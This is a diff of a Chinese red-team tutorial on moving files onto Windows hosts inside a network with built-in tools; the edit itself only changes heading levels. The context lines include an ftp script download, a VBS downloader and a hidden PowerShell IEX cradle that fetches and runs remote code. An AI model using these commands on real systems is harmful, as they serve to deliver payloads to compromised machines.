@@ -5,7 +5,7 @@
 
 本文简述内网Windows主机文件传输技术，包括利用ftp、VBScript、powershell、certutil.exe、bitsadmin、Xcopy，都是些老技术，整理分享。
 
-# 一、ftp
+## 一、ftp
 
 windows 全平台自带ftp，在实战中需要考虑两点。
 
@@ -49,7 +49,7 @@ echo open IP > o & echo get Target_File.exe >> o &echo quit>>o &ftp -A -n -s:o &
 
 
 
-# 二、VBS
+## 二、VBS
 
 编写VBS脚本并保存
 
@@ -77,7 +77,7 @@ cscript downfile.vbs http://192.168.126.130:8000/flag.txt  C:\Inetpub\b.txt
 
 VBS作为一门代码语言，可以有多种代码编写的方式，不只这一种
 
-# 三、Powershell
+## 三、Powershell
 
 ```shell
 # 远程下载文件到本地： 
@@ -90,7 +90,7 @@ exp.exe
 powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.183.138:8000/test.txt'))"
 ```
 
-# 四、certutil
+## 四、certutil
 
 Certutil.exe是一个命令行程序，作为证书服务的一部分安装。您可以使用Certutil.exe转储和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件以及验证证书，密钥对和证书链。
 
@@ -117,7 +117,7 @@ certutil还自带base64编码解码功能
  certutil -decode c:\downfile.bat downfile.txt
 ```
 
-# 五、bitsadmin
+## 五、bitsadmin
 
  BITSAdmin是一个命令行工具，可用于创建下载或上传并监视其进度。 
 
@@ -179,7 +179,7 @@ bitsadmin /setpriority down foreground
 
 
 
-# 六 、Xcopy
+## 六 、Xcopy
 
 Windows 自带命令，复制文件和目录树
 
